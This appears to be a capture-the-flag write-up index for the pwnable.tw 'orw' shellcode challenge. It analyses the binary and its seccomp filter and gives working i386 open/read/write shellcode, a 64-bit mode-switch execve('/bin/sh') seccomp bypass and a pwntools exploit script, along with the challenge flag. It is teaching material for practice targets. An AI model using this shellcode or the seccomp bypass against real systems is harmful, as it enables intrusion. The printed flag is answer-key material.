---
tags:
  - shellcode
  - seccomp-bypass
platform: pwnable.tw
points: 100
arch: i386
libc: static
relro: partial
canary: yes
nx: no
pie: no
references:
  - https://pwnable.tw/challenge/
description: "A fixed RWX BSS buffer executes user shellcode restricted by a seccomp filter to open, read, and write syscalls to read the flag file."
proof-of-concept: no
---

# orw — pwnable.tw (100 pts)

[← Back to pwnable.tw Challenge Index](README.md)

> `nc chall.pwnable.tw 10001`
>
> Flag: `FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}`

## Challenge Overview

A minimal i386 shellcode challenge. The binary reads up to 0xc8 (200) bytes of user input into a fixed BSS buffer at `0x804a060`, then jumps to it. Before execution, a seccomp BPF filter is installed via `prctl` that restricts syscalls to only `open`, `read`, `write` (plus `exit`, `exit_group`, `sigreturn`, `rt_sigreturn`). The goal is to read `/home/orw/flag` using only those three syscalls.

```
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO
  Stack:    Canary found
  NX:       NX disabled         # writable + executable BSS
  PIE:      No PIE (0x8048000)
  RWX:      Has RWX segments
```

## Binary Analysis

### `main` Disassembly

```asm
08048548 <main>:
 8048559:  call   80484cb <orw_seccomp>     ; install seccomp filter
 8048561:  push   0x80486a0                 ; "Give my your shellcode:"
 8048566:  call   8048380 <printf@plt>
 8048571:  push   0xc8                      ; count = 200 bytes
 8048576:  push   0x804a060                 ; buf = BSS buffer
 804857b:  push   0x0                       ; fd = stdin
 804857d:  call   8048370 <read@plt>        ; read(0, 0x804a060, 0xc8)
 8048585:  mov    eax, 0x804a060
 804858a:  call   *eax                      ; execute shellcode
```

### Seccomp Filter (BPF rules)

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011   # NOTE: non-i386 → ALLOW
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)       # deny
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

**Allowed i386 syscalls:** `open` (5), `read` (3), `write` (4), `exit` (1), `exit_group` (252), `sigreturn` (119), `rt_sigreturn` (173).

**Seccomp bug:** The architecture check at line 0001 jumps to ALLOW for non-i386 architectures. This means switching to x86-64 mode via `retf` to CS=0x33 bypasses all restrictions, allowing `execve("/bin/sh")`.

## Vulnerability

### V1 — Arbitrary Shellcode Execution (Primary)

**Root Cause:** The program reads user-supplied shellcode into an RWX BSS buffer and calls it directly with `call *eax`. No validation of the input beyond the seccomp filter.

```c
// Pseudocode of main
void main() {
    orw_seccomp();                         // install BPF filter
    printf("Give my your shellcode:");
    read(0, (void *)0x804a060, 0xc8);      // read up to 200 bytes
    ((void(*)())0x804a060)();              // execute as code
}
```

**Impact:** Full shellcode execution, constrained only by seccomp to `open`/`read`/`write` syscalls (on i386).

### V2 — Seccomp Architecture Check Bug (Bonus)

**Root Cause:** The BPF filter checks `if (arch != ARCH_I386) goto ALLOW`. Non-i386 syscalls are **allowed**, not denied. On an x86-64 kernel running a 32-bit binary, a `retf` to segment selector `0x33` switches the CPU to 64-bit long mode, where all syscalls (including `execve`) pass the filter.

```asm
; Switch from 32-bit to 64-bit mode
mov dword [esp+4], 0x33   ; CS selector for 64-bit
retf                       ; far return → now in amd64 mode
; 64-bit execve("/bin/sh") shellcode follows
```

**Impact:** Full shell via `execve`, completely bypassing the intended open/read/write restriction.

## Exploit Paths

### Path A — open/read/write Shellcode (Intended, Standard)

**Used by:** ~95% of all 302 solutions

The canonical approach: write i386 shellcode that chains `open("/home/orw/flag")` → `read(fd, buf, len)` → `write(1, buf, len)`.

**Shellcode logic (C equivalent):**
```c
int fd = open("/home/orw/flag", O_RDONLY, 0);   // syscall 5
read(fd, buf, 0x30);                             // syscall 3
write(1, buf, 0x30);                             // syscall 4
```

**Typical hand-written assembly (i386, ~50-70 bytes):**
```asm
; === open("/home/orw/flag", O_RDONLY, 0) ===
xor  eax, eax
xor  ecx, ecx
push eax                    ; NUL terminator
push 0x67616c66             ; "flag"
push 0x2f77726f             ; "orw/"
push 0x2f656d6f             ; "ome/"
push 0x682f2f2f             ; "///h"  (extra / padding for alignment)
mov  ebx, esp               ; ebx = pointer to path on stack
xor  edx, edx
mov  al, 5                  ; SYS_open
int  0x80                   ; fd returned in eax

; === read(fd, esp, 0x40) ===
mov  ebx, eax               ; ebx = fd
mov  ecx, esp               ; ecx = buffer (reuse stack)
mov  dl, 0x40               ; edx = count
xor  eax, eax
mov  al, 3                  ; SYS_read
int  0x80

; === write(1, esp, 0x40) ===
mov  edx, eax               ; edx = bytes read
xor  ebx, ebx
mov  bl, 1                  ; ebx = stdout
mov  al, 4                  ; SYS_write
int  0x80
```

**Variations across solutions:**

| Variant | Description |
|---------|-------------|
| **Stack string** | Push path as dwords onto stack (most common) |
| **Embedded string** | `call`/`pop` or `jmp`/`call`/`pop` to get address of inline string |
| **Hardcoded BSS address** | Read file contents into a known BSS address (e.g., `0x804a040`, `0x804a100`) instead of stack |
| **Two-stage read** | First shellcode does `read(0, writable, N)` to receive the path string, then `open`/`read`/`write` |
| **pwntools shellcraft** | `shellcraft.open() + shellcraft.read() + shellcraft.write()` or `shellcraft.cat2()` |
| **Byte-at-a-time** | Read and write one byte at a time in a loop (shell-storm.org shellcode-73) |
| **Hardcoded fd=3** | Assume `open` returns fd 3 (since 0/1/2 are stdin/stdout/stderr) |

**Buffer choice for `read`:**
- **Stack (`esp`)** — most common, no address needed
- **BSS (`0x804a040`+)** — static address, no PIE, safe
- **Shellcode buffer itself (`0x804a060`+)** — RWX, works if shellcode is short enough

---

### Path B — Architecture Switch to x86-64 → `execve("/bin/sh")` (Seccomp Bypass)

**Used by:** Solutions 1225, 1727, and a few others

Exploits the seccomp filter bug where non-i386 architectures are allowed. Uses `retf` with CS=0x33 to switch the CPU from 32-bit compatibility mode to 64-bit long mode, then executes standard amd64 `execve("/bin/sh")` shellcode.

```asm
; Stage 1: switch to 64-bit mode
jmp  setup
to64:
    mov  dword [esp+4], 0x33    ; CS selector for long mode
    retf                         ; far return → 64-bit mode
setup:
    call to64

; Stage 2: standard amd64 execve("/bin/sh")
xor    eax, eax
mov    rbx, 0xff978cd091969dd1  ; NOT("/bin/sh\0")
not    rbx
push   rbx
push   rsp
pop    rdi
cdq
push   rdx
push   rdi
push   rsp
pop    rsi
mov    al, 0x3b                 ; SYS_execve (amd64)
syscall
```

**Impact:** Full interactive shell, not just flag read. Completely bypasses the intended ORW restriction.

**Reliability:** 100% — no randomness involved. However, requires the remote kernel to support 64-bit mode (which it does, as it's a 64-bit host running 32-bit binaries).

---

### Path C — pwntools One-Liner (Convenience)

**Used by:** Many solutions

Leverages pwntools' `shellcraft` module to auto-generate the shellcode:

```python
from pwn import *
context(arch='i386', os='linux')
p = remote("chall.pwnable.tw", 10001)
shellcode = asm(
    shellcraft.open("/home/orw/flag") +
    shellcraft.read("eax", "esp", 50) +
    shellcraft.write(1, "esp", 50)
)
p.sendlineafter(":", shellcode)
print(p.recv())
```

Or even shorter with `shellcraft.cat2()`:
```python
shellcode = shellcraft.cat2("/home/orw/flag")
```

## Key Technical Details

### Syscall Numbers (i386 `int 0x80`)

| Syscall | Number | Registers |
|---------|--------|-----------|
| `open`  | 5      | ebx=path, ecx=flags, edx=mode |
| `read`  | 3      | ebx=fd, ecx=buf, edx=count |
| `write` | 4      | ebx=fd, ecx=buf, edx=count |
| `exit`  | 1      | ebx=status |

### String Encoding for `/home/orw/flag`

The path must be pushed onto the stack as 32-bit dwords in reverse order, with padding for 4-byte alignment:

```
"/home/orw/flag\x00" (15 bytes) → pad to 16 with extra '/'

"///home/orw/flag\x00" pushed as:
  push 0x00000000     ; NUL terminator (or xor eax,eax; push eax)
  push 0x67616c66     ; "flag"
  push 0x2f77726f     ; "orw/"
  push 0x2f656d6f     ; "ome/"
  push 0x682f2f2f     ; "///h"
```

Some solutions avoid the NUL push by using `0x00006761` for the last dword (with high bytes being zero), or use `call`/`pop` to reference an inline string.

### Memory Layout

| Address | Content |
|---------|---------|
| `0x804a060` | Shellcode buffer (BSS, RWX, 200 bytes max) |
| `0x804a040` | Start of `.bss` section |
| `0x804a000` | `.got.plt` |

## Solution Write-ups

| File | Approach | Key Technique | Notes |
|------|----------|---------------|-------|
| `100.md` | A | Byte-at-a-time loop from shell-storm.org | Classic shellcode-73 |
| `117.md` | A | Hand-crafted shellcode with XOR-encoded path | Pushes path with XOR trick to avoid NUL |
| `1001.md` | A (pwntools) | `shellcraft.open` + `shellcraft.read` + `shellcraft.write` | Cleanest pwntools approach |
| `1039.md` | A | NASM assembly, standalone `.asm` file | Uses `xchg` tricks for compact code |
| `1045.md` | A (pwntools) | `shellcraft.open` + `shellcraft.read(3, 'esp', 50)` | Hardcodes fd=3 |
| `1151.md` | A (pwntools) | `shellcraft.pushstr` + `shellcraft.syscall` | Uses BSS `0x804a800` as read buffer |
| `1169.md` | A | Compact hand-crafted, 41 bytes | Uses `xchg`/`mul` tricks for minimal size |
| `1225.md` | **B** | **x86-64 arch switch via `retf` to CS=0x33** | Full shell bypass of seccomp filter |
| `1266.md` | A | Hardcoded BSS addresses for path and buffer | References `0x804a095` and `0x804a220` |
| `1297.md` | A | Stack-push path, `xchg` for register shuffling | Clean 32-bit int 0x80 |
| `1316.md` | A | Go language exploit client | Sends raw shellcode bytes via Go net.Dial |
| `1754.md` | A | Detailed learning log with GDB debugging | Shows full development process |
| `10068.md` | A | NASM standalone + Python sender | Clean separation of asm and exploit |
| `10115.md` | A | Hardcoded BSS buffer `0x804a140` | Uses `mov` instead of `push`/`pop` |
| `10840.md` | A | Two-stage: `read` path string, then ORW | Sends path as second payload |
| `11543.md` | A | Intel syntax `.s` file + shell pipeline | `as --32` + `objcopy` + `nc` |
| `12928.md` | A | NASM with `call`/`pop` for inline string | Classic `jmp`-`call`-`pop` pattern |
| `14121.md` | A | Detailed Chinese writeup with seccomp analysis | Uses `seccomp-tools`, explains BSS layout |
| `18160.md` | A | Seccomp analysis + pwntools `shellcraft.cat2` | One-liner convenience approach |
| `18582.md` | A | NASM + Python, detailed step-by-step | Good pedagogical writeup |
| `20313.md` | A | Chinese writeup with full assembly explanation | Explains fd=3 assumption, stack balance |
| `28834.md` | A | `shellcraft.cat2("/home/orw/flag")` | Shortest pwntools approach |

## Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit (raw socket, `call`/`pop` shellcode) |
| `desc.txt` | Challenge description |
| `artifacts/orw` | Original challenge binary (i386, stripped) |
| `solution/*.md` | Community write-ups (302 solutions) |
